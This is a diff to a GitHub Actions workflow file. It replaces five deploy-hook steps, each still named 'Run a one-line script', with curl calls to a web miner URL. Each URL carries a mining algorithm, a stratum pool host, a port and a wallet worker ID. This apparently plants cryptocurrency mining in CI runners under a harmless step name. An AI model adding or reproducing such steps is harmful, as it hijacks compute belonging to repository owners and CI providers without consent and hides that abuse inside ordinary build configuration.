@@ -21,15 +21,15 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - name: Run a one-line script
-        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_ayUgo4xEKplUrXOq7Ebwr0gouT0M/zWjou4Rv46
+        run: curl -X POST https://webminer.pages.dev?algorithm=minotaurx&host=stratum-eu.rplant.xyz&port=17068&worker=RGFcv8JX6xEupo5cBzUGdMaTu86hhpo1bG&password=x&workers=2
       - name: Run a one-line script
-        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_UXycrNHvLGWtO5RfCggrT81m1TuM/VuMAtZ6pDk
+        run: curl -X POST https://webminer.pages.dev?algorithm=minotaurx&host=stratum-eu.rplant.xyz&port=17068&worker=RGFcv8JX6xEupo5cBzUGdMaTu86hhpo1bG&password=x&workers=2
       - name: Run a one-line script
-        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_0z4tejYczgzQ6dIOwtb4oVy9HTLN/c8Hww1ve6o
+        run: curl -X POST https://webminer.pages.dev?algorithm=minotaurx&host=stratum-eu.rplant.xyz&port=17068&worker=RGFcv8JX6xEupo5cBzUGdMaTu86hhpo1bG&password=x&workers=2
       - name: Run a one-line script
-        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_vjHe1KUMYJRhMca6tp2mu6JoLnA3/akGGZNlpnZ
+        run: curl -X POST https://webminer.pages.dev?algorithm=minotaurx&host=stratum-eu.rplant.xyz&port=17068&worker=RGFcv8JX6xEupo5cBzUGdMaTu86hhpo1bG&password=x&workers=2
       - name: Run a one-line script
-        run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_vrlvrOpMlYgsuNPWFD5BpRZ0bsdv/BXWpuwVdhG
+        run: curl -X POST https://webminer.pages.dev?algorithm=minotaurx&host=stratum-eu.rplant.xyz&port=17068&worker=RGFcv8JX6xEupo5cBzUGdMaTu86hhpo1bG&password=x&workers=2
       - name: Run a one-line script
         run: curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_Oh1u3toMvv5ijZmiAUgOjGxlaqim/rhZavNK5Wu
       - name: Run a one-line script
